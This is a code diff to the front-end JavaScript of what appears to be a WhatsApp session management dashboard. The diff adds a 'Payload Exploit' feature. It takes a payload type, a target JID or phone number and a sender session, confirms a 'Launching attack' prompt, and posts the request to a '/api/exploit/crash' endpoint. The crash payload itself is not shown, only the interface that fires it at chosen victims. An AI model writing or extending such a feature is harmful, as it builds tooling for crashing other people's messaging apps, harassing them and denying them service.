@@ -222,6 +222,45 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         });
     }
+    
+    // --- Payload Exploit ---
+    const sendExploitBtn = document.getElementById('sendExploitBtn');
+    const exploitSenderSession = document.getElementById('exploitSenderSession');
+
+    if (sendExploitBtn) {
+        sendExploitBtn.addEventListener('click', async () => {
+            const type = document.getElementById('payloadType').value;
+            const target = document.getElementById('exploitTarget').value.trim();
+            const sessionPhone = exploitSenderSession.value;
+
+            if (!target) return showToast('Please enter a target JID or number', 'error');
+            
+            if (!confirm(`🚀 Launching ${type} attack on ${target}. Are you sure?`)) return;
+
+            sendExploitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Launching Attack...';
+            sendExploitBtn.disabled = true;
+
+            try {
+                const res = await fetch('/api/exploit/crash', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'x-api-key': apiKey },
+                    body: JSON.stringify({ type, target, sessionPhone })
+                });
+
+                const data = await res.json();
+                if (data.success) {
+                    showToast(data.message, 'success');
+                } else {
+                    showToast(data.error || 'Failed to launch attack', 'error');
+                }
+            } catch (error) {
+                showToast('Network error', 'error');
+            } finally {
+                sendExploitBtn.innerHTML = 'Launch Payload Attack <i class="fa-solid fa-rocket"></i>';
+                sendExploitBtn.disabled = false;
+            }
+        });
+    }
 
     // --- Analytics Dashboard ---
     function initAnalyticsChart() {
@@ -519,6 +558,7 @@ document.addEventListener('DOMContentLoaded', () => {
         // Only update select options if length changed to prevent losing user selection while polling
         if(senderSession.options.length !== (sessions.filter(s=>s.status==='CONNECTED').length + 1)) {
             senderSession.innerHTML = optionsHtml;
+            if(exploitSenderSession) exploitSenderSession.innerHTML = optionsHtml;
         }
     }
 
